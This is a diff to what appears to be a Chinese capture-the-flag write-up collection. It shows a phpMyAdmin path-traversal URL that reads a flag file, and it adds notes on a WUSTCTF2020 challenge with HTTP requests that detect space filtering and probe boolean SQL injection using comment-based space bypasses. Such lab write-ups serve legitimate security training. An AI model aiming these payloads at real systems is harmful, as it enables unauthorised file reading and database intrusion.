@@ -1117,3 +1117,15 @@ phpmyadmin漏洞
 ```sh
 http://08e377bc-2a2b-41f2-8df0-36cd7cd516f5.node5.buuoj.cn:81/phpmyadmin/?target=db_datadict.php%253f/../../../../../../../../flag
 ```
+### [颜值成绩查询](https://buuoj.cn/challenges#[WUSTCTF2020]%E9%A2%9C%E5%80%BC%E6%88%90%E7%BB%A9%E6%9F%A5%E8%AF%A2)
+```sh
+GET /?stunum=%201 HTTP/1.1
+```
+判断空格被过滤
+```sh
+GET /?stunum=1/**/and/**/1=1 HTTP/1.1
+GET /?stunum=1/**/and/**/1=2 HTTP/1.1
+```
+判断是bool注入......
+
+
